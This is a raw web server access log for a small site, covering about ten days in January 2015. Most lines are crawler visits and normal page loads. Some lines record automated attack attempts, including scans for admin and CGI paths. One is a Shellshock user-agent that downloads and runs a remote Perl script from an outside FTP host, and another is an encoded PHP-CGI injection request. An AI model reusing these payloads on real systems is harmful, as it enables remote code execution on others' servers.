91.236.75.92 - - [17/Jan/2015:06:10:26 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"
193.104.41.59 - - [17/Jan/2015:12:34:37 -0500] "GET /wp-login.php HTTP/1.1" 404 - - "Go 1.1 package http"
136.243.14.163 - - [18/Jan/2015:10:46:36 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; AdvBot/2.0; +http://advbot.net/bot.html)"
136.243.14.163 - - [18/Jan/2015:10:46:38 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; AdvBot/2.0; +http://advbot.net/bot.html)"
136.243.14.163 - - [18/Jan/2015:10:46:43 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; AdvBot/2.0; +http://advbot.net/bot.html)"
62.117.80.169 - - [18/Jan/2015:11:15:29 -0500] "HEAD / HTTP/1.0" 200 - - "-"
85.25.48.150 - - [18/Jan/2015:11:27:50 -0500] "GET HTTP/1.1 HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget ftp://upload:upload@195.56.45.117/www/cox.pl -O /tmp/cox.pl;curl -O /tmp/cox.pl ftp://upload:upload@195.56.45.117/www/cox.pl;perl /tmp/cox.pl;rm -rf /tmp/cox.pl*");'"
149.129.30.246 - - [18/Jan/2015:14:18:33 -0500] "GET /tmUnblock.cgi HTTP/1.1" 404 - - "-"
109.200.104.14 - - [18/Jan/2015:18:34:43 -0500] "GET /upgrade.htm HTTP/1.1" 404 - - "libwww-perl/6.04"
179.43.133.34 - - [18/Jan/2015:22:51:04 -0500] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 404 - - "-"
62.117.80.169 - - [18/Jan/2015:23:24:44 -0500] "HEAD / HTTP/1.0" 200 - - "-"
157.55.39.79 - - [19/Jan/2015:10:20:59 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.79 - - [19/Jan/2015:10:21:03 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
117.21.191.37 - - [19/Jan/2015:15:03:27 -0500] "HEAD /index.action HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
117.21.191.37 - - [19/Jan/2015:15:03:28 -0500] "HEAD /login.action HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
117.21.191.37 - - [19/Jan/2015:15:03:28 -0500] "HEAD /unAuthorizedAccess.action HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
188.138.17.205 - - [19/Jan/2015:20:13:22 -0500] "GET / HTTP/1.1" 200 - - "-"
104.192.0.18 - - [19/Jan/2015:20:28:03 -0500] "GET /rom-0 HTTP/1.0" 404 - - "-"
69.64.46.145 - - [19/Jan/2015:22:08:42 -0500] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 404 - - "-"
167.61.16.216 - - [20/Jan/2015:07:07:04 -0500] "HEAD / HTTP/1.0" 200 - - "-"
188.138.17.205 - - [20/Jan/2015:07:28:32 -0500] "GET / HTTP/1.1" 200 - - "-"
188.138.17.205 - - [20/Jan/2015:07:28:32 -0500] "GET /robots.txt HTTP/1.1" 404 - - "-"
197.254.80.34 - - [20/Jan/2015:11:08:20 -0500] "GET /tmUnblock.cgi HTTP/1.1" 404 - - "-"
182.118.54.46 - - [20/Jan/2015:17:07:35 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
66.249.65.169 - - [20/Jan/2015:19:07:21 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.169 - - [20/Jan/2015:19:07:21 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.217 - - [20/Jan/2015:19:12:59 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.217 - - [20/Jan/2015:19:12:59 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
178.211.33.154 - - [20/Jan/2015:19:26:34 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
66.249.73.225 - - [20/Jan/2015:20:11:23 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.225 - - [20/Jan/2015:20:22:20 -0500] "GET /starter-template.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.225 - - [20/Jan/2015:20:22:21 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.161 - - [20/Jan/2015:21:25:19 -0500] "GET /starter-template.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.169 - - [20/Jan/2015:21:25:20 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
91.238.134.99 - - [20/Jan/2015:21:51:13 -0500] "GET http://pl.wikipedia.org/wiki/Special:Search?search=&go=Go HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
66.249.73.225 - - [20/Jan/2015:23:05:55 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
198.154.60.143 - - [21/Jan/2015:00:59:27 -0500] "POST //%63%67%69%2D%62%69%6E/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1" 404 - - "-"
66.249.73.225 - - [21/Jan/2015:02:01:13 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.162.239.224 - - [21/Jan/2015:03:53:50 -0500] "HEAD / HTTP/1.1" 200 - - "Cloud mapping experiment. Contact research@pdrlabs.net"
66.249.73.217 - - [21/Jan/2015:04:56:05 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.40 - - [21/Jan/2015:06:57:34 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.36 - - [21/Jan/2015:06:57:34 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.89 - - [21/Jan/2015:08:09:11 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.93 - - [21/Jan/2015:08:09:11 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.196.252.243 - - [21/Jan/2015:08:53:59 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)"
66.249.64.97 - - [21/Jan/2015:11:10:34 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.93 - - [21/Jan/2015:14:07:12 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
208.46.240.4 - - [21/Jan/2015:14:53:41 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
208.46.240.4 - - [21/Jan/2015:14:53:41 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
208.46.240.4 - - [21/Jan/2015:14:53:41 -0500] "GET /starter-template.css HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
208.46.240.4 - - [21/Jan/2015:14:53:41 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
208.46.240.4 - - [21/Jan/2015:14:53:41 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
208.46.240.4 - - [21/Jan/2015:14:53:41 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
208.46.240.4 - - [21/Jan/2015:14:53:42 -0500] "GET /favicon.ico HTTP/1.1" 200 5108 - "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
54.86.102.142 - - [21/Jan/2015:16:25:12 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
66.249.64.97 - - [21/Jan/2015:18:09:07 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.93 - - [21/Jan/2015:18:47:27 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.97 - - [21/Jan/2015:21:05:41 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.89 - - [21/Jan/2015:21:05:41 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
177.230.89.211 - - [21/Jan/2015:21:21:24 -0500] "GET /tmUnblock.cgi HTTP/1.1" 404 - - "-"
66.249.64.89 - - [22/Jan/2015:00:03:22 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.36 - - [22/Jan/2015:06:09:29 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.40 - - [22/Jan/2015:06:09:29 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.36 - - [22/Jan/2015:06:41:19 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.28 - - [22/Jan/2015:06:41:19 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
62.117.80.169 - - [22/Jan/2015:06:47:10 -0500] "HEAD / HTTP/1.0" 200 - - "-"
203.200.160.187 - - [22/Jan/2015:07:31:43 -0500] "GET //cgi-bin/php HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
203.200.160.187 - - [22/Jan/2015:07:31:44 -0500] "GET //cgi-bin/php5 HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
203.200.160.187 - - [22/Jan/2015:07:31:44 -0500] "GET //cgi-bin/php-cgi HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
203.200.160.187 - - [22/Jan/2015:07:31:45 -0500] "GET //cgi-bin/php.cgi HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
203.200.160.187 - - [22/Jan/2015:07:31:46 -0500] "GET //cgi-bin/php_cgi HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
203.200.160.187 - - [22/Jan/2015:07:31:46 -0500] "GET //cgi-bin/php4 HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
203.200.160.187 - - [22/Jan/2015:07:31:47 -0500] "GET //cgi-bin/php3 HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
203.200.160.187 - - [22/Jan/2015:07:31:47 -0500] "GET //index.php HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
203.200.160.187 - - [22/Jan/2015:07:31:48 -0500] "GET //phppath/php HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
203.200.160.187 - - [22/Jan/2015:07:31:48 -0500] "GET //phppath/php5 HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
203.200.160.187 - - [22/Jan/2015:07:31:49 -0500] "GET //local-bin/php HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
203.200.160.187 - - [22/Jan/2015:07:31:50 -0500] "GET //local-bin/php5 HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
203.200.160.187 - - [22/Jan/2015:07:31:50 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
123.249.35.54 - - [22/Jan/2015:07:47:34 -0500] "POST /login.action HTTP/1.1" 404 - - "Mozilla/5.0"
91.200.13.64 - - [22/Jan/2015:10:03:09 -0500] "GET / HTTP/1.0" 200 - - "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0"
182.118.53.71 - - [22/Jan/2015:16:27:11 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
98.126.3.78 - - [22/Jan/2015:17:03:45 -0500] "GET /actionnews/index/ HTTP/1.1" 404 - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
23.94.123.242 - - [22/Jan/2015:17:08:52 -0500] "GET /phppath/php HTTP/1.0" 404 - - "-"
91.238.134.99 - - [22/Jan/2015:17:48:39 -0500] "GET http://pl.wikipedia.org/wiki/Special:Search?search=&go=Go HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
66.249.67.129 - - [22/Jan/2015:18:28:03 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.137 - - [22/Jan/2015:18:28:03 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
91.238.134.99 - - [22/Jan/2015:23:50:44 -0500] "GET http://pl.wikipedia.org/wiki/Special:Search?search=&go=Go HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
31.192.105.59 - - [23/Jan/2015:00:39:52 -0500] "GET / HTTP/1.0" 200 - - "-"
128.208.4.164 - - [23/Jan/2015:01:11:09 -0500] "GET / HTTP/1.0" 200 - - "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
91.238.134.99 - - [23/Jan/2015:02:28:33 -0500] "GET http://pl.wikipedia.org/wiki/Special:Search?search=&go=Go HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
185.35.62.11 - - [23/Jan/2015:05:35:24 -0500] "HEAD / HTTP/1.1" 200 - - "-"
198.20.70.114 - - [23/Jan/2015:09:20:23 -0500] "GET / HTTP/1.1" 200 - - "-"
198.20.70.114 - - [23/Jan/2015:09:20:24 -0500] "GET /robots.txt HTTP/1.1" 404 - - "-"
185.35.62.11 - - [23/Jan/2015:13:13:44 -0500] "HEAD / HTTP/1.1" 200 - - "-"
104.192.0.18 - - [23/Jan/2015:20:45:57 -0500] "GET /rom-0 HTTP/1.0" 404 - - "-"
66.249.67.129 - - [24/Jan/2015:05:51:10 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.121 - - [24/Jan/2015:05:51:10 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.121 - - [24/Jan/2015:05:56:06 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.121 - - [24/Jan/2015:05:56:07 -0500] "GET /starter-template.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
64.74.215.150 - - [24/Jan/2015:05:58:41 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
64.74.215.150 - - [24/Jan/2015:05:58:41 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
64.74.215.150 - - [24/Jan/2015:05:58:41 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
64.74.215.150 - - [24/Jan/2015:05:58:41 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
185.35.62.11 - - [24/Jan/2015:13:00:50 -0500] "HEAD / HTTP/1.1" 200 - - "-"
5.63.146.172 - - [24/Jan/2015:16:42:43 -0500] "GET /admin/ HTTP/1.1" 404 - "http://euterpea.com/admin/" ""Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0""
184.170.171.183 - - [24/Jan/2015:16:53:50 -0500] "GET / HTTP/1.1" 200 - - "-"
184.170.171.183 - - [24/Jan/2015:16:53:50 -0500] "GET //Net_work.xml HTTP/1.1" 404 - - "-"
182.118.53.70 - - [24/Jan/2015:17:28:42 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
188.138.17.205 - - [24/Jan/2015:23:15:46 -0500] "GET / HTTP/1.1" 200 - - "-"
188.138.17.205 - - [24/Jan/2015:23:15:46 -0500] "GET /robots.txt HTTP/1.1" 404 - - "-"
104.148.38.33 - - [25/Jan/2015:08:54:36 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
185.35.62.11 - - [25/Jan/2015:13:08:20 -0500] "HEAD / HTTP/1.1" 200 - - "-"
64.95.98.11 - - [25/Jan/2015:18:04:49 -0500] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 - - "-"
65.110.39.179 - - [25/Jan/2015:19:26:20 -0500] "GET /cgi-bin/test-cgi HTTP/1.1" 404 - - "the beast"
208.66.73.10 - - [25/Jan/2015:19:43:42 -0500] "GET / HTTP/1.0" 200 - - "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
66.249.67.121 - - [26/Jan/2015:05:15:13 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.137 - - [26/Jan/2015:05:15:13 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.121 - - [26/Jan/2015:05:26:31 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
176.102.38.151 - - [26/Jan/2015:09:13:44 -0500] "GET /wp-login.php HTTP/1.0" 404 - - "Mozilla/4.0 (compatible; Synapse)"
176.102.38.151 - - [26/Jan/2015:09:13:45 -0500] "GET /administrator/index.php HTTP/1.0" 404 - - "Mozilla/4.0 (compatible; Synapse)"
176.102.38.151 - - [26/Jan/2015:09:13:45 -0500] "GET /user/ HTTP/1.0" 404 - - "Mozilla/4.0 (compatible; Synapse)"
176.102.38.151 - - [26/Jan/2015:09:13:45 -0500] "GET / HTTP/1.0" 200 - - "Mozilla/4.0 (compatible; Synapse)"
73.49.171.151 - - [26/Jan/2015:11:23:01 -0500] "GET /tmUnblock.cgi HTTP/1.1" 404 - - "-"
185.35.62.11 - - [26/Jan/2015:12:18:00 -0500] "HEAD / HTTP/1.1" 200 - - "-"
66.249.65.169 - - [26/Jan/2015:13:36:25 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.169 - - [26/Jan/2015:13:36:25 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.169 - - [26/Jan/2015:13:39:29 -0500] "GET /starter-template.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
104.148.38.34 - - [26/Jan/2015:14:07:22 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
66.249.65.165 - - [26/Jan/2015:15:10:30 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.165 - - [26/Jan/2015:15:11:35 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.165 - - [26/Jan/2015:15:34:32 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.161 - - [26/Jan/2015:17:27:46 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
182.118.60.66 - - [26/Jan/2015:18:14:51 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
66.249.65.165 - - [26/Jan/2015:20:24:43 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
71.254.183.35 - - [26/Jan/2015:23:21:12 -0500] "HEAD / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Gimme60bot/1.0; +http://gimme60.com)"
71.254.183.35 - - [26/Jan/2015:23:21:12 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Gimme60bot/1.0; +http://gimme60.com)"
66.249.65.165 - - [26/Jan/2015:23:26:59 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.165 - - [27/Jan/2015:02:38:13 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.169 - - [27/Jan/2015:02:38:13 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.161 - - [27/Jan/2015:08:58:22 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
188.138.17.205 - - [27/Jan/2015:11:23:58 -0500] "GET / HTTP/1.1" 200 - - "-"
188.138.17.205 - - [27/Jan/2015:11:23:58 -0500] "GET /robots.txt HTTP/1.1" 404 - - "-"
66.249.65.165 - - [27/Jan/2015:12:52:46 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.56.86.199 - - [27/Jan/2015:12:56:51 -0500] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 - - "-"
185.56.86.199 - - [27/Jan/2015:12:56:51 -0500] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 - - "-"
185.56.86.199 - - [27/Jan/2015:12:56:52 -0500] "GET //pma/scripts/setup.php HTTP/1.1" 404 - - "-"
185.56.86.199 - - [27/Jan/2015:12:56:52 -0500] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 - - "-"
185.35.62.11 - - [27/Jan/2015:13:21:07 -0500] "HEAD / HTTP/1.1" 200 - - "-"
107.23.45.196 - - [27/Jan/2015:14:03:04 -0500] "GET / HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
107.23.45.196 - - [27/Jan/2015:14:03:05 -0500] "GET /favicon.ico HTTP/1.1" 200 5108 "http://euterpea.com/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
185.56.86.199 - - [27/Jan/2015:14:25:33 -0500] "GET /muieblackcat HTTP/1.1" 404 - - "-"
